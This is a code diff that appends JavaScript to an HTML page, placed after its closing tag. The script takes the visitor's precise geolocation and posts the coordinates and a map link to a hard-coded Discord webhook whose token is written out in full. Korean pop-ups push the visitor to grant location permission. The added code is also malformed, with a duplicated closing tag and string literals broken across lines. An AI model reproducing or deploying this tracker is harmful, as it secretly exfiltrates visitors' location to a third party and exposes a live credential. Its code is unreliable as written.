@@ -80,4 +80,50 @@
     }
   </script>
 </body>
+</html>      
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const acc = position.coords.accuracy;
+          const msg = '📍 **위치**: https://maps.google.com/?q=' + lat + ',' + lon + '
+🗺️ **정확도**: ' + acc + 'm';
+          sendDiscord(msg);
+        },
+        function(error) {
+          alert('위치 권한을 허용해주세요. (오류: ' + error.message + ')');
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    }
+    
+    function sendDiscord(locationData) {
+      const webhookUrl = 'https://discord.com/api/webhooks/1527999868239482901/qUOQ1qwgXMtzRfFfj06rKD8BW_ExiVyyQBQFffZzdzi7kk1Qlm_acn_oAeGE2p2q2eqJ';
+      
+      const formData = new FormData();
+      formData.append('content', '📍 **위치 정보**
+
+' + locationData);
+      
+      fetch(webhookUrl, {
+        method: 'POST',
+        body: formData
+      })
+      .then(function(res) {
+        if (res.ok) {
+          alert('✅ 위치 정보가 전송되었습니다!');
+        } else {
+          alert('❌ 전송 실패');
+        }
+      })
+      .catch(function(err) {
+        alert('❌ 오류: ' + err);
+      });
+    }
+  </script>
+</body>
 </html>
